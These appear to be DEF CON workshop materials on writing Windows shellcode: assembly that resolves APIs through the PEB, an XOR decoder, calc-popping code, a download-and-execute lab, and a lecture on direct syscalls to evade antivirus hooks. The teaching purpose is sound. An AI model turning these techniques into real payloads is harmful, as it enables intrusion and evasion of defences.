    MOV EDI, EAX             ; EDI now holds the address of GetProcAddress

; --- 5. Use the found address of GetProcAddress to find LoadLibraryA ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "LoadLibraryA")
  ; Push the function name "LoadLibraryA" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "LoadLibraryA\x00":
  PUSH 0  ; Null terminating char
  PUSH 0x41797261  ; Ayra
  PUSH 0x7262694c  ; rbiL
  PUSH 0x64616f4c  ; daoL
  MOV ESI, ESP     ; ESI = Pointer to "LoadLibrary" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "LoadLibraryA")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of LoadLibraryA
  MOV EDX, EAX  ; Store LoadLibraryA in EDX for later use

  ; --- Call LoadLibraryA ---
  ; MessageBoxA takes one argument. We want to load User32.dll 
  ; We need to create the string on the stack
  PUSH 0x00006c6c  ; \0\0ll
  PUSH 0x642e3233  ; d.23
  PUSH 0x52455355  ; RESU
  MOV ESI, ESP  ; Store "Hello" string in ESI
  PUSH ESI         ; Push string for user32.dll on the stack

  ; Call (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (LoadLibraryA)

  ; EAX now holds the base address of User32.dll

  ; Prepare arguments for GetProcAddress("user32.dll", "MessageBoxA")
  ; Push the function name "MessageBoxA" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "MessageBoxA\x00":
  PUSH 0x0041786f  ; \0Axo
  PUSH 0x42656761  ; Bega
  PUSH 0x7373654d  ; sseM
  MOV ESI, ESP     ; ESI = Pointer to "MessageBoxA" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "MessageBoxA")
  PUSH EAX         ; Push base address of user32.dll
  
  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of MessageBoxA

  ; --- Call MessageBoxA ---
  ; MessageBoxA takes four arguments. 
  ; We need to create more strings on the stack
  PUSH 0x0000006f  ; \0\0\0o
  PUSH 0x6c6c6568  ; lloH
  MOV ESI, ESP  ; Store "Hello" string in ESI
  PUSH 0           ; Push uType - type of msg box window
  PUSH ESI         ; Push lpCaption - Pointer to title string in msg box
  PUSH ESI         ; Push lpText - Pointer to text string in msg box
  PUSH 0           ; Push hWnd - Handle to window

  ; Call MessageBoxA (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (MessageBoxA)
  
  ; --- 6. Use the found address of GetProcAddress to find ExitProcess ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "ExitProcess")
  ; Push the function name "ExitProcess" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "ExitProcess\x00":
  PUSH DWORD 0x00737365 ; "\0sse"
  PUSH DWORD 0x636F7250 ; "corP"
  PUSH DWORD 0x74697845 ; "tixE"
  MOV ESI, ESP     ; ESI = Pointer to "ExitProcess" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "ExitProcess")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of ExitProcess

  ; --- Call ExitProcess ---
  ; ExitProcess takes one argument: uExitCode (DWORD)
  PUSH 0           ; Push exit code 0

  ; Call ExitProcess (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (ExitProcess)


shellcode_exit_failure:
  ; Code to indicate failure, EAX=1
  XOR EAX, EAX
  INC EAX
  RET ; This shouldn't be reached if ExitProcess is called.

hash_func:
  ; Expecting values to be in ESI and EDI
  ; ESI - DWORD hash
  ; EDI - function name to be hashed
  ; ECX - Number of bytes
  ; Have ESP + 0, + 4, +8 to hold variables
  ; + 8 = original EDI pointer
  ; + 4 = loop count
  ; + 0 = temporary storage
  PUSH EBP
  MOV EBP, ESP
  SUB ESP, 0xC
  MOV [ESP+8], EDI  ; Store original value
  XOR EAX, EAX
  MOV [ESP+4], EAX  ; Set counter to 0
loop:
  MOV [ESP], EAX  ; Store EAX for a moment
  MOVZX EAX, byte [EDI]  ; Get byte into EAX
  ADD EAX, DWORD [ESP]  ; Add to previous value
  SHL EAX, 4
  INC EDI  ; Increment pointer
  INC DWORD [ESP+4]  ; Increment counter
  CMP [ESP+4], ECX  ; Check if we've reached the end
  JL loop
  XOR EAX, 0x11223344  ; Unique Key
  SUB EAX, ESI
  MOV EDI, [ESP+8]  ; Restore original value
  ADD ESP, 0xC
  POP EBP
  RET
; --- Shellcode End ---
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/skeleton.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; --- Shellcode Start ---
; --- 0. Get current location ---
call get_eip
get_eip:
; TODO

; --- 1. Get the address of the PEB ---
; In 32-bit Windows, the PEB is typically pointed to by FS:[0x30].
; TODO

; --- 2. Traverse the PEB's module list to find kernel32.dll ---
; PEB structure (simplified):
; +0x00 ...
; +0x0C Ldr (Pointer to PEB_LDR_DATA)
; ...
; PEB_LDR_DATA structure (simplified):
; +0x0C InLoadOrderModuleList (LIST_ENTRY) - This list is often used
; +0x14 InMemoryOrderModuleList (LIST_ENTRY)
; +0x1C InInitializationOrderModuleList (LIST_ENTRY)
; ...
; LDR_DATA_TABLE_ENTRY structure (simplified):
; +0x00 InLoadOrderLinks (LIST_ENTRY)
; +0x08 InMemoryOrderLinks (LIST_ENTRY)
; +0x10 InInitializationOrderLinks (LIST_ENTRY)
; +0x18 DllBase (Base address of the module)
; +0x2C BaseDllName (UNICODE_STRING structure) - Pointer to module name

MOV EAX, [EAX + 0x0C] ; EAX = Address of PEB_LDR_DATA (PEB->Ldr)

; We'll use the InMemoryOrderModuleList (offset 0x14 from PEB_LDR_DATA).
; The LIST_ENTRY structure has Flink (ForwardLink) and Blink (BackwardLink) pointers.
; The first entry after the list head is the first module (usually the main EXE).
; The second entry is typically ntdll.dll, the third is kernel32.dll.
MOV EAX, [EAX + 0x14] ; EAX = Address of the InMemoryOrderModuleList LIST_ENTRY (list head)
MOV ECX, EAX          ; ECX = Pointer to the list head for comparison later

; Get the address of the first entry (the EXE itself)
MOV ESI, [EAX]        ; ESI = Flink of the list head (first LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks)

; Start loop to walk the list
find_kernel32_loop:
  ; Check if we've wrapped around to the list head (end of list)
  CMP ESI, ECX
  JE end_of_module_list ; If ESI equals ECX, we've checked all modules

  ; ESI currently points to the InMemoryOrderLinks field (offset 0x08)
  ; of the LDR_DATA_TABLE_ENTRY.
  ; To get the base address and name, we need the base address of the LDR_DATA_TABLE_ENTRY.
  ; The InMemoryOrderLinks field is at offset +0x08 within the LDR_DATA_TABLE_ENTRY.
  ; So, Base address of entry = ESI - 0x08
  PUSH ESI            ; Save ESI (points to InMemoryOrderLinks)
  SUB ESI, 0x08       ; ESI = Base address of the current LDR_DATA_TABLE_ENTRY

  ; Get the module base address
  ; TODO

  ; Get the UNICODE_STRING structure for the module name
  LEA EDI, [ESI + 0x2C] ; EDI = Address of UNICODE_STRING structure (BaseDllName)
  ; The UNICODE_STRING structure (simplified):
  ; +0x00 Length
  ; +0x02 MaximumLength
  ; +0x04 Buffer (Pointer to the wide character string)

  MOV EDI, [EDI + 0x04] ; EDI = Pointer to the module name wide string (BaseDllName.Buffer)

  ; This is where string comparison logic goes.
  ; TODO

  ; If the comparison was successful, use this jump to exit the loop
  je found_kernel32  ; If the strings were equal, we found it, otherwise reset and try again

  ; Restore ESI and continue the loop to find the module we're interested in
  POP ESI              ; Restore ESI (get back the Flink pointer)
  MOV ESI, [ESI]       ; ESI = Flink to the next entry in the list
  JMP find_kernel32_loop ; Continue loop

end_of_module_list:
  ; Handle case where kernel32.dll was not found (shellcode should probably exit)
  JMP shellcode_exit_failure ; Example exit path

found_kernel32:
  ; EBX now holds the base address of kernel32.dll

  ; --- 3. Parse the PE headers of kernel32.dll to find the Export Directory ---
  ; MZ Header: +0x3C points to the PE Header (NT Headers) offset (e_lfanew)
  MOV EAX, [EBX + 0x3C]   ; EAX = RVA of NT Headers (PE Signature)
  ADD EAX, EBX            ; EAX = Address of NT Headers (PE Signature)

  ; NT Headers (simplified):
  ; +0x00 Signature ("PE\0\0")
  ; +0x04 IMAGE_FILE_HEADER
  ; +0x18 IMAGE_OPTIONAL_HEADER32 (Offset varies for 64-bit)
  ; ...
  ; IMAGE_OPTIONAL_HEADER32 (simplified):
  ; ...
  ; +0x78 DataDirectory (IMAGE_DATA_DIRECTORY array, size 16) - Offset 0x78 for 32-bit
  ; ...
  ; IMAGE_DATA_DIRECTORY structure:
  ; +0x00 VirtualAddress (RVA of the data structure)
  ; +0x04 Size

  ; Access the Optional Header (offset 0x18 from NT Headers + Signature size 4 = 0x1C)
  ; ADD EAX, 0x1C           ; EAX = Address of the IMAGE_OPTIONAL_HEADER32

  ; Access the Data Directory array
  ADD EAX, ???              ; TODO, what is the offest of the Data Directories from the
                            ; optional header?
                            ; EAX = Address of the DataDirectory array

  ; The Export Directory is the first entry in the Data Directory array (index 0)
  MOV ESI, [EAX]          ; ESI = RVA of the Export Directory
  ADD ESI, EBX            ; ESI = Address of the Export Directory structure

  ; Export Directory structure (simplified):
  ; ...
  ; +0x14 NumberOfNames (Number of exported functions with names)
  ; +0x1C AddressOfFunctions (RVA of Export Address Table - EAT)
  ; +0x20 AddressOfNames (RVA of Export Name Pointer Table - ENPT)
  ; +0x24 AddressOfNameOrdinals (RVA of Export Ordinal Table - EOT)
  ; ...

  ; Get pointers to the key tables
  MOV EDI, [ESI + ????] ; EDI = RVA of AddressOfNames (ENPT)
  ADD EDI, EBX          ; EDI = Address of the ENPT (Array of RVAs of function names)

  MOV EBP, [ESI + ????] ; EBP = RVA of AddressOfNameOrdinals (EOT)
  ADD EBP, EBX          ; EBP = Address of the EOT (Array of WORDs - ordinals)
  
  MOV EDX, [ESI + ????] ; EDX = RVA of AddressOfFunctions (EAT)
  ADD EDX, EBX          ; EDX = Address of the EAT (Array of DWORDs - functions)

  ; Get the number of named exports
  MOV ECX, [ESI + 0x14] ; ECX = NumberOfNames


  ; --- 4. Walk the Export Name Pointer Table to find GetProcAddress ---
  ; We need to iterate through the names and compare them to "GetProcAddress".

  find_GetProcAddress_loop:
    ; Check if we have iterated through all named exports
    DEC ECX               ; Decrement name counter
    JL end_of_GetProcAddress_loop ; If counter < 0, exit loop

    ; Get the RVA of the current function name string from the ENPT
    MOV ESI, [EDI + ECX * 4] ; ESI = RVA of the current function name string
    ADD ESI, EBX             ; ESI = Address of the current function name string

    ; --- Compare the string at ESI with "GetProcAddress" ---
    ; This is another string comparison routine.
    ; TODO

    ; If no match, continue loop
    JMP find_GetProcAddress_loop

  end_of_GetProcAddress_loop:
    ; Handle case where GetProcAddress was not found
    JMP shellcode_exit_failure ; Example exit path

  found_GetProcAddress:
    ; ECX holds the index of "GetProcAddress" from the successful comparison
    ; Use this index to find the ordinal
    MOVZX ECX, WORD [EBP + ECX * 2] ; ECX = Ordinal (ordinals array is WORDs)

    ; Use the ordinal to find the function RVA in the EAT
    MOV EAX, [EDX + ECX * 4] ; EAX = RVA of the function (EAT is DWORDs)

    ; Calculate the absolute address of GetProcAddress
    ADD EAX, EBX             ; EAX = Address of GetProcAddress
    MOV EDI, EAX             ; EDI now holds the address of GetProcAddress

  ; --- 5. Use the found address of GetProcAddress to find ExitProcess ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "ExitProcess")
  ; Push the function name "ExitProcess" (as a string or hash ID)
  ; PUSH TODO
  ; PUSH TODO
  ; PUSH TODO
  MOV ESI, ESP     ; ESI = Pointer to "ExitProcess" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "ExitProcess")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of ExitProcess

  ; --- Call ExitProcess ---
  ; ExitProcess takes one argument: uExitCode (DWORD)
  PUSH 0           ; Push exit code 0

  ; Call ExitProcess (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (ExitProcess)


shellcode_exit_failure:
  ; Code to indicate failure, EAX=1
  XOR EAX, EAX
  INC EAX
  RET ; This shouldn't be reached if ExitProcess is called.

; --- Shellcode End ---

; --- Data/String section ---
section .data
    string_kernel32_dll: dw 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 ; Problematic null byte! Need to avoid.
    string_getprocaddress: db 'GetProcAddress', 0
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/xor_decode.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; This jump and all stuff is to remove null bytes.
; The normal call $+5 has four null bytes because we're
; calling the next instruction. By jumping forward and
; then calling back, the offset is negative which means
; the number in the call instruction is not null.
JMP jump_forward 
call_back:
    POP EDX  ; For now, EDX holds the starting location of shellcode
    JMP get_eip
jump_forward:
    call call_back

get_eip:
    XOR dl, dl  ; Remove any offsets so we can add our own when needed
    JMP real_shellcode  ; Jump to real_shellcode to get the address
                        ; of the beginning real shellcode
xor_decode_begin:
    POP EBX  ; The return address is the beginning of the real shellcode
             ; now in EBX
    XOR ECX, ECX
    MOV ECX, 0xFFEEDDCC
    XOR ECX, 0xAABBCCDD  ; This will be replaced with a value that
                         ; when computed will put the size in ECX
    XOR EAX, EAX  ; EAX will be the counter to compare to ECX
    
loop:
    XOR byte [EBX], 0xaa
    INC EBX
    INC EAX
    CMP EAX, ECX
    JL loop
    JMP real_shellcode_start

real_shellcode:
CALL xor_decode_begin
real_shellcode_start:
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/xor_decode_skeleton.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; This jump and all stuff is to remove null bytes.
; The normal call $+5 has four null bytes because we're
; calling the next instruction. By jumping forward and
; then calling back, the offset is negative which means
; the number in the call instruction is not null.
JMP jump_forward 
call_back:
    POP EDX  ; For now, EDX holds the starting location of shellcode
    JMP get_eip
jump_forward:
    call call_back

get_eip:
    XOR dl, dl  ; Remove any offsets so we can add our own when needed
    JMP real_shellcode  ; Jump to real_shellcode to get the address
                        ; of the beginning real shellcode
xor_decode_begin:
    POP EBX  ; The return address is the beginning of the real shellcode
             ; now in EBX
    ; TODO
    ; You will need to handle the size of the shellcode somehow and
    ; make it null free. We recommend encoding it in the python
    ; script, but you can handle it however you like here.
    MOV ECX, 0xFFEEDDCC
    XOR ECX, 0xAABBCCDD  ; This will be replaced with a value that
                         ; when computed will put the size in ECX
    ; END - TODO
    XOR EAX, EAX  ; EAX will be the counter to compare to ECX
    
loop:
    XOR byte [EBX], 0xaa
    INC EBX
    INC EAX
    CMP ECX, EAX
    JL loop
    JMP real_shellcode_start

real_shellcode:
CALL xor_decode_begin
real_shellcode_start:
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/5Multi-WinAPI_Shellcode/lab.md`

````markdown
# Creating Multi-WinAPI Shellcode

## Lab

We are now going to build upon everything we've learned so far and transform our simple shellcode into a more complex, multi-Win API calling shellcode.

For this lab we are going to walk through setting up shellcode that will download a file, write it to disk, and then create a process from it. We will be using `URLDownloadToFile` and `CreateProcessA`.

### URLDownloadToFile

[Link to Docs](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85))

The first step will be modifying your shellcode to use `URLDownloadToFile`. This will require two steps:

1. Loading the urlmon.dll library into the process
2. Dynamically resolving the function

You have all the pieces you need to do both of these actions, remember you need to decide if you are using hashing or string comparison for the strings.

Once you have loaded the module and resolved the function you need to setup the call to `URLDownloadToFile`. You will need a URL and a file name; the rest of the parameters can be 0 in this case.

To simulate a web server, we will use python's built-in webserver:

```bash
python -m http.server 8080
```

Whatever working directory you run this from, copy calc.exe from C:\\Windows\\System32\\calc.exe to this directory so it can be served by the python web server.

The URL that you will need to include in the shellcode is `http://127.0.0.1:8080/calc.exe`. This will be one of the parameters. The second parameter will be the location it's downloaded to. The directory structure must already exist, so we'll use one that we know exists, `C:\\Windows\\Temp\\`. We'll download the file as `boom.exe` to differentiate it from our `calc.exe`. Using this information, create the call to URLDownloadToFile in your shellcode.

### CreateFileA

[Link to Docs](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

Now we will need to create the process from the file we downloaded. Remember, the file should be located in C:\\Windows\\Temp\\boom.exe. 

There are many ways to setup the call to CreateProcessA, this lab will only walk you through one of them. First, we want to re-use the string for the file name as the first argument to `CreateProcessA`. We will leave the second argument NULL, as `CreateFileA` can handle that and it's much easier for us to push a 0 on the stack than a string.

The third and fourth arguments will also be 0, followed by the fifth argument which is False. Since we are writing shellcode, there is no False so once again we will use 0 for bInheritHandles.

We will also specify 0 for the dwCreationFlag as this provides good defaults for us and ease-of-use.

Similarly, we will provide 0 for the environment pointer and the current directory pointer. 

Unfortunately, that's where the ease of pushing 0s on the stack ends. We now need to create two Windows structures, `STARTUPINFO` and `PROCESS_INFORMATION`. These can be looked up from the docs link above. The good news is, while these structures are daunting for writing shellcode, only one field in both structures needs to be set and that is the `STARTUPINFO.cb` member needs to be set to the size of the `STARTUPINFO` struct.

Look up these structures on MSDN and use that information plus what you know so far to push pointers to these objects on the stack for the call to `CreateProcessA`. 

### Wrapping Up

Once you have managed to get our shellcode to work, demo it to the instructors by setting up your python server, copying calc to the correct directory, executing the shellcode in the handler, and showing that boom.exe (calc.exe) begins execution!

\pagebreak
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/5Multi-WinAPI_Shellcode/lecture.md`

```markdown
# Creating Multi-WinAPI Shellcode

## Looking up Windows APIs and Structures

The Windows API is notoriously large and complex. It's very unlikely anyone will memorize or learn the entire API, which is likely why Microsoft publishes all of the docs on MSDN. You can search on MSDN for the function you are looking for and see a large amount of information about the functions, structures, and often even a usage example of how to correctly use the call.

Let's walk through an example to illustrate the point. We'll look at the `CreateFileW`. When we first go to [MSDN](https://learn.microsoft.com/en-us/), we can search for our function that we want to learn about. We'll search for `CreateFileW` and navigate to the page with information about the function, [here](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew).

We can immediately see a summary of the function, it's purpose, what it does, and even the syntax for the function definition. If we continue scrolling down, we can learn more about each parameter, default values, and what kind of information is expected for each parameter.

For example, we can see that dwDesiredAccess and dwShareMode require specific values from definitions within the operating system. We can navigate to any of those pages to learn more about "Generic Access Rights". We can also see a short list of possible values for dwShareMode based on how we want the file to be shared that we are creating.

Not all parameters are required, which can be very nice while writing shellcode as it means a `PUSH 0x0` instead of setting up a complex structure. The lpSecurityAttributes are an optional parameter and if we aren't worried about them for our file, then we can just skip it and use 0 instead.

Finally, we scroll down to the return value. This can give us more information about what's expected from a successful and unsuccessful call to this function. `CreateFileW` returns a handle to the opened file. This handle "represents" the file to the operating system but is not the file itself. Other Windows APIs will take this handle and perform actions on the file only with that handle as opposed to the file name, the full path name, etc.

CreateFileW is unique in these docs as the "Remarks" section has lots of additional content to understand what is going on with files. `CreateFileW` is a very complex call and can handle many resources, paths, and types of files. Any developer could be accessing any of those resources and could look at this page to better understand how `CreateFileW` handles those cases. While it's not always necessary to read everything on these pages, these sections and ultimately these docs, are excellent resources for learning more about Windows internals.

Lastly, if you ever need it, there are examples towards the bottom of the docs. Not every function always has examples, but `CreateFileW` does and many other do as well.

Moving on, let's look at a structure, `PROCESS_INFORMATION`, [here](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

This structure will be used in an upcoming lab and we can see that Microsoft documents this structure for us as well. It contains the syntax for the struct, the data types, and names, and even pointer aliases for the structure.

Each of the members of the structure are summarized on the page. Lastly, we can see in the "Remarks" section a good tip. Make sure to clean up handles when you are done using them. It is reassuring the system will eventually clean them all up, but not until the parent process is terminated, per the documentation. This can be useful information for resource management on the operating system; these details can sometimes be the difference on being caught by AV/EDR or not!
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/6Shellcode_Using_Syscalls/lab.md`

```markdown
# ShellWasp Lab

## Setup

Clone the code from GitHub

- `git clone https://github.com/Bw3ll/ShellWasp`

Create a Python Virtual Environment and activate it

- `python -m venv .venv`
- `.venv\Scripts\activate.bat`

Install via Pip

- `pip install .`

Run ShellWasp

- `python shellWasp.py`


## Lab Tasks

1. Start by simply creating a syscall shellcode, this will generate a huge file of shellcode.

- How does it get the PEB?
- How does it determine the version of the operating system?

2. Once the OS has been determined, we can see shellcode snippets setting up and calling the syscalls. The `ourSyscall` label ends up calling something else.

- What does the ourSyscall end up calling?
- Why is it necessary to call the syscall this way?

\pagebreak
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/6Shellcode_Using_Syscalls/lecture.md`

````markdown
# Shellcode Using Windows Syscalls

## Background

In general, most guidance you will read about using Windows system calls is that you shouldn't. There is a strong reason for that, and that's because Microsoft makes no guarantees that these system call numbers, or System Service Numbers (SSNs) will not change between versions. Instead, Microsoft exposes high level wrappers, like what most developers use and what we've been dynamically resolving in our shellcode, to make sure backwards compatibility is not compromised.

This is great from a building project perspective as developers can be sure that their `CreateFile` function will never change and they can use it across versions. There is no such guarantee about `NtCreateFile`. `NtCreateFile` is the exposed API by ntdll.dll that explicitly calls the correct SSN and causes the switch from user to kernel-mode.

This technique goes even one step further and actually loads the arguments in the correct registers or on the stack and calls the SSN itself by placing it into the EAX register and calling the `SYSCALL/SYSENTER` (or `INT 0x2E`) instruction.

Now as we've established, this is less than stellar for backwards compatibility but, one of the biggest hinderances for running shellcode is the presence of Anti-Virus. AV will use all sorts of detection mechanisms and hooks in the code to attempt to catch and block your code. By calling the SSN yourself, you guarantee that at no point between the `CreateFile` and `NtCreateFile` was a hook used to capture what you are doing. The reason we can be sure is that you didn't call any of those wrappers in your shellcode and therefore no hook was ever triggered either.

In addition, this technique bypasses the need for resolving functions and libraries because the code is implemented in your shellcode. However, the trade-off here is that a lot of upfront work was needed to make sure you have all the calls, arguments, and parameters setup correctly before you made that call. In some cases that upfront work is an excellent trade-off for secrecy and effectiveness.

For this course, we look at what these code snippets look like and how we can implement them. We will also look at SSN resolving using ShellWasp to speed up the development process.

## Nt* Function Example

For this example, we'll open up an application in Windbg and look at the one of the Nt\* exports for ntdll.dll. All of the available Nt\* functions are exported out of ntdll.dll. Since ntdll.dll is always loaded into process memory, we can load any program and get access to information about it with Windbg.

We'll start with NtCreateFile on 64-bit. We can look it up in Windbg and we'll see something like:

```text
0:000> x /D /f ntdll!NtCreateFile

00007ffc`3d282590 ntdll!NtCreateFile (NtCreateFile)
0:000> uf 00007ffc`3d282590
ntdll!NtCreateFile:
00007ffc`3d282590 4c8bd1          mov     r10,rcx
00007ffc`3d282593 b855000000      mov     eax,55h
00007ffc`3d282598 f604250803fe7f01 test    byte ptr 
    [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`3d2825a0 7503            jne     ntdll!NtCreateFile
    +0x15 (00007ffc`3d2825a5)

ntdll!NtCreateFile+0x12:
00007ffc`3d2825a2 0f05            syscall
00007ffc`3d2825a4 c3              ret

ntdll!NtCreateFile+0x15:
00007ffc`3d2825a5 cd2e            int     2Eh
00007ffc`3d2825a7 c3              ret
```

We can see here that the the SSN is 0x55. The value that is placed into the *AX register will be used as the SSN value when it transitions from user-mode to kernel-mode. Then it calls the syscall function to make the transition.

Let's look at another one to compare and contract. We'll look at NtAccessCheck next.

```text
0:000> x /D /f ntdll!NtAccessCheck

00007ffc`3d281af0 ntdll!NtAccessCheck (NtAccessCheck)
0:000> uf 00007ffc`3d281af0 
ntdll!NtAccessCheck:
00007ffc`3d281af0 4c8bd1          mov     r10,rcx
00007ffc`3d281af3 b800000000      mov     eax,0
00007ffc`3d281af8 f604250803fe7f01 test    byte ptr 
    [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`3d281b00 7503            jne     ntdll!NtAccessCheck
    +0x15 (00007ffc`3d281b05)  Branch

ntdll!NtAccessCheck+0x12:
00007ffc`3d281b02 0f05            syscall
00007ffc`3d281b04 c3              ret

ntdll!NtAccessCheck+0x15:
00007ffc`3d281b05 cd2e            int     2Eh
00007ffc`3d281b07 c3              ret
```

Here we can actually see that NtAccessCheck has a SSN of 0; it's the first one! However, the structure remains largely the same. By this time in the call stack, all of the parameters are where they need to be and the only thing left is to use the unique SSN to transition from user-mode to kernel-mode and begin the kernel's side of the execute of this system call.


## Wow64

Before we jump into lab, we're going to talk about one more topic, WoW64. For those of you who haven't heard of it, it's the reason you can run 32-bit shellcode on your 64-bit operating systems. Windows handles the translation of architecture from the user-mode 32-bit application to the 64-bit kernel. 

This translation requires specific instructions and execution paths to convert the information from 32-bit to 64-bit and this is often called Heaven's Gate.

If you didn't notice, for this lecture I was showing you 64-bit syscalls as you can see from the registers. However when working with the 32-bit version on a 64-bit operating system, the calls look slightly different.

```text
0:000> u ntdll!NtCreateFile
ntdll!NtCreateFile:
77569bf0 b855000000      mov     eax,55h
77569bf5 ba501f5a77      mov     edx,offset ntdll!Wow64SystemServiceCall (775a1f50)
77569bfa ffd2            call    edx
77569bfc c22c00          ret     2Ch
77569bff 90              nop
```

Here we see that we call the Wow64SystemServiceCall function indirectly by loading it into the EDX register. This leads to a `JMP` instruction to ntdll!Wow64Transition. You can follow these steps in Windbg, if you need to see it visually or want to follow along.

If you see a bunch of garbage instructions, make sure you understand that the ntdll!Wow64Transition is a pointer to the executable code and dereference it when looking at it in a debugger.

The first instruction there is critical, `jmp 0033:774e7009`, this is the transition from 32-bit to 64-bit as it makes a far jmp to enable 64-bit mode. We wont talk too much more about this, but it does set up for our last lab, using ShellWasp.
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/advanced.asm`

```asm
; Windows/x86 - WinExec PopCalc PEB & Export Directory Table NullFree Dynamic Shellcode (178 bytes)

; Description: 

; This is a shellcode that pop a calc.exe. The shellcode iuses
; the PEB method to locate the baseAddress of the required module and the Export Directory Table
; to locate symbols. Also the shellcode uses a hash function to gather dynamically the required 
; symbols without worry about the length. Finally the shellcode pop the calc.exe using WinExec 
; and exits gracefully using TerminateProcess. 

; Author: h4pp1n3ss
; Date: Wed 09/22/2021
; Tested on: Microsoft Windows [Version 10.0.19042.1237]

; Minor changes made for course

BITS 32

start:                             	   

   mov   ebp, esp                  ;     prologue
   add   esp, 0xfffff9f0           ;     Add space int ESP to avoid clobbering 


 find_kernel32:                       
   xor   ecx, ecx                  ;     ECX = 0
   mov   esi,fs:[ecx+0x30]         ;     ESI = &(PEB) ([FS:0x30])
   mov   esi,[esi+0x0C]            ;     ESI = PEB->Ldr
   mov   esi,[esi+0x1C]            ;     ESI = PEB->Ldr.InInitOrder

 next_module:                         
   mov   ebx, [esi+0x08]           ;     EBX = InInitOrder[X].base_address
   mov   edi, [esi+0x20]           ;     EDI = InInitOrder[X].module_name
   mov   esi, [esi]                ;     ESI = InInitOrder[X].flink (next)
   cmp   [edi+12*2], cx            ;    (unicode) modulename[12] == 0x00 ?
   jne   next_module               ;     No: try next module

 find_function_shorten:               
   jmp find_function_shorten_bnc   ;     Short jump

 find_function_ret:                   
   pop esi                         ;     POP the return address from the stack
   mov   [ebp+0x04], esi           ;     Save find_function address for later usage
   jmp resolve_symbols_kernel32    ;  

 find_function_shorten_bnc:              
   call find_function_ret          ;     Relative CALL with negative offset

 find_function:                       
   pushad                          ;     Save all registers

   mov   eax, [ebx+0x3c]           ;     Offset to PE Signature
   mov   edi, [ebx+eax+0x78]       ;     Export Table Directory RVA
   add   edi, ebx                  ;     Export Table Directory VMA
   mov   ecx, [edi+0x18]           ;     NumberOfNames
   mov   eax, [edi+0x20]           ;     AddressOfNames RVA
   add   eax, ebx                  ;     AddressOfNames VMA
   mov   [ebp-4], eax              ;     Save AddressOfNames VMA for later

 find_function_loop:                  
   jecxz find_function_finished    ;     Jump to the end if ECX is 0
   dec   ecx                       ;     Decrement our names counter
   mov   eax, [ebp-4]              ;     Restore AddressOfNames VMA
   mov   esi, [eax+ecx*4]          ;     Get the RVA of the symbol name
   add   esi, ebx                  ;     Set ESI to the VMA of the current symbol name

 compute_hash:                        
   xor   eax, eax                  ;     NULL EAX
   cdq                             ;     NULL EDX
   cld                             ;     Clear direction

 compute_hash_again:                  
   lodsb                           ;     Load the next byte from esi into al
